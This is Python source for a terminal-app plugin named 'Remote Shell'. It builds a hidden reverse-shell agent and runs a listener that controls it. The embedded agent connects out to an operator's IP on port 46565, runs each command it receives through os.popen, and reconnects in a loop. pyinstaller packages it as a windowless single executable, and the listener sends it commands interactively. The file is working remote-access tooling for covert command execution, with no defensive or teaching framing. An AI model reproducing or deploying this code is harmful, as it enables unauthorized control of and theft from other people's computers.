import socket, subprocess, colorama, os, shutil
from hooks import hooks as _hooks
from terminal import Terminal
from plugins.commands import Commands

hooks    = _hooks()
commands = Commands()

class NewAgent(object):
    def __init__(self, server_host: str, server_port: int):
        self.agent_data = """
import socket, os

TARGET_SERVER = "{IP_ADDRESS}"
TARGET_PORT   = {SERVER_PORT}

def main():
    print("Trying to connect to server...")
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((TARGET_SERVER, TARGET_PORT))

    while True:
        packet = client.recv(8064).decode()
        if packet.startswith('cd'):
            os.chdir(packet[3:])
            client.send(b' ')

        elif len(packet) > 0:
            command = os.popen(packet).read()
            if not command:
                command = " "
            client.send(command.encode())

while True:
    try: main()
    except Exception as e: print("Agent error: " + str(e))
    """.replace("{IP_ADDRESS}", server_host).replace("{SERVER_PORT}", str(server_port))

    def checkPyinstaller(self):
        print("Checking for pyinstaller...")
        proc = subprocess.Popen("pyinstaller --version", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        proc.wait()
        if proc.returncode != 0:
            print("Pyinstaller not found. Would you like to install it? (y/n)")
            if input().lower() == "y":
                subprocess.Popen("pip install pyinstaller", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).wait()
                print("Pyinstaller installed successfully.")
            return
        print(f"{colorama.Fore.GREEN}Pyinstaller found.{colorama.Fore.RESET}")


    def generate_agent(self, install_path: str):
        print(('='*10)+'[ Generating Agent ]'+('='*10))
        self.checkPyinstaller()
        if not os.path.exists(os.path.join(install_path, 'tmp')): os.mkdir(os.path.join(install_path, 'tmp'))
        if os.path.exists(os.path.join(install_path, 'tmp', 'agent')): shutil.rmtree(os.path.join(install_path, 'tmp', 'agent'))
        os.mkdir(os.path.join(install_path, 'tmp', 'agent'))
        with open(os.path.join(install_path, 'tmp', 'agent', 'agent.py'), 'w') as f: f.write(self.agent_data)
        print("Generating agent...")
        proc = subprocess.Popen(f"pyinstaller --onefile --noconsole --workpath \"{os.path.join(install_path, 'tmp')}\" --distpath \"{os.path.join(install_path, 'tmp', 'agent')}\" \"{os.path.join(install_path, 'tmp', 'agent', 'agent.py')}\"", shell=True).wait()
        if proc != 0:
            print(f"{colorama.Fore.RED}Error generating agent.{colorama.Fore.RESET}")
            return
        print(f"{colorama.Fore.GREEN}Agent generated successfully.{colorama.Fore.RESET}")
        print("Cleaning up...")
        #Copy tmp/agent/agent.exe to tmp/agent.exe
        shutil.copyfile(os.path.join(install_path, 'tmp', 'agent', 'agent.exe'), os.path.join(install_path, 'tmp', 'agent.exe'))
        shutil.rmtree(os.path.join(install_path, 'tmp', 'agent'))
        os.remove(os.path.join(install_path, 'agent.spec'))
        print(f"{colorama.Fore.GREEN}Agent cleaned up successfully.{colorama.Fore.RESET}")


class RemoteClient(object):
    def __init__(self):
        #Reverse shell server/terminal
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind(("0.0.0.0", 46565))

    def waitForDevice(self):
        self.server.listen(5)
        self.client, self.address = self.server.accept()
        print(f"Connection from {self.address} has been established!")

        while True:
            self.client.send(b'cd')
            cDir = self.client.recv(8064).decode()
            cmd = input(f"{cDir} > ")

            if cmd == "exit":
                break
            self.client.send(cmd.encode())
            response = self.client.recv(16024).decode()
            print(response)

class RemoteShell(object):
    def __init__(self):
        self.name = "Remote Shell"
        self.version = "0.1"
        self.author = "Dylan Bruner"
        self.description = "Easy and basic remote shell"
        self.hooks = {}
    
    def _on_load(self, terminal: Terminal):
        commands: Commands = terminal.get_plugin("commands.py")
        commands.register_command("!remote-start", self.remote, "Remote shell")
        commands.register_command("!remote-generate", self.generate, "Generate a new agent")
    
    def getMyIpV4(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(('1.1.1.1', 80))
            ip = s.getsockname()[0]
        except:  ip = None
        finally: s.close()
        return ip
    
    @commands.requestTerminalRefrence
    def generate(self, terminal: Terminal, data: str):
        myip = self.getMyIpV4()
        target_ip = input(f"Target IP ({myip}): ")
        if target_ip == "": target_ip = myip
        agent     = NewAgent(target_ip, 46565)
        agent.generate_agent(terminal.install_path)

    @commands.requestTerminalRefrence
    def remote(self, terminal: Terminal, data: dict):
        print("Launching remote listener...")
        print("My IP: " + self.getMyIpV4(), "hosting on 0.0.0.0")
        client = RemoteClient()
        print("Waiting for device...")
        client.waitForDevice()

    
EXPORTS = [RemoteShell()]